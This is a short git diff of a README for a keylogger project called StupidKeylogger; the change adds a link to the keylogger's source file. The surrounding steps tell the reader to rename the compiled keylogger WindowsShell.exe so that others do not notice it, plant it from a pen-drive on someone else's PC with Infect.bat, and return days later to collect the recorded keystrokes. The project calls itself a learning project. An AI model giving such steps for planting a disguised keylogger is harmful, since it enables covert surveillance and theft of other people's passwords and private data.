@@ -14,7 +14,7 @@ This project is created only for learning purpose.
   <img src="https://cloud.githubusercontent.com/assets/5456665/18231884/984f4d58-72e5-11e6-8401-725c6906c040.PNG" alt="StupidKeylogger"/>
 </div>
 
-2. **WindowsShell.exe** is the compiled and renamed form of **Keylogger.cpp** (of course you do not expect others to let you insert a pen-drive containing keylogger!). **WindowsShell.lnk** is a link file of **WindowsShell.exe**. Now insert your pen-drive in a computer, and run **Infect.bat**. This will install **WindowsShell.exe** and **WindowsShell.lnk** in that PC.
+2. **WindowsShell.exe** is the compiled and renamed form of [**Keylogger.cpp**](https://github.com/MinhasKamal/StupidKeylogger/blob/master/com/minhaskamal/stupidKeylogger/Keylogger.cpp) (of course you do not expect others to let you insert a pen-drive containing keylogger!). **WindowsShell.lnk** is a link file of **WindowsShell.exe**. Now insert your pen-drive in a computer, and run **Infect.bat**. This will install **WindowsShell.exe** and **WindowsShell.lnk** in that PC.
 
 3. Wait for some days, then return to the PC, and run **CollectData.bat**. You will get a file named **Record.log**.
 
